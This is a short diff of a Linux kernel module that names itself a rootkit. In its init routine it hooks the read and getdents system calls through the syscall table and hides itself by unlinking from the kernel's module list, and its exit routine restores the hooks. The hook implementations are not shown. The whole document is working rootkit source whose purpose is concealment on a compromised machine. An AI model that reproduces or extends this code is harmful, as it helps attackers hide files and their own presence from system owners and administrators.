@@ -4,21 +4,26 @@
 #include <linux/printk.h>
 
 #include "hooking.h"
-#include "hiding.h"
+#include "hooked_funcs/h_read.h"
+#include "hooked_funcs/h_getdents.h"
 
 static __init int rootkit_init(void)
 {
     get_kallsyms_funcptr();
     get_syscall_table();
     hijack_read();
-    replace_getdents();
-    module_hide();
+    hijack_getdents();
+
+    list_del(&THIS_MODULE->list);
+
     return 0;
 }
 
 static __exit void rootkit_exit(void)
 {
-    clear_getdents();
+    restore_getdents();
+
+    restore_read();
     return;
 }
 
